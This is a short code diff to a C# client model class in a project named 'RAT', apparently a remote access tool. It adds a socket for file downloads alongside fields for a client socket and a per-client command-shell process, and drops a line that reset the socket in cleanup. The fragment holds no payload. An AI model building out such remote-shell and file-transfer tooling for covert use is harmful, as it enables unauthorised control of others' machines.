@@ -25,6 +25,11 @@ namespace RAT.src.Models
         public Socket ClientSocket { get; set; }
 
         /// <summary>
+        /// Client socket for file downloads.
+        /// </summary>
+        public Socket ClientFileDownloadSocket { get; set; }
+
+        /// <summary>
         /// Cmd process related to client.
         /// </summary>
         public Process ClientCmdProcess { get; set; }
@@ -36,7 +41,6 @@ namespace RAT.src.Models
         {
             DataArray = new byte[1024];
             DataBuilder = new StringBuilder();
-            ClientSocket = null;
             ClientCmdProcess.Kill();
         }
     }
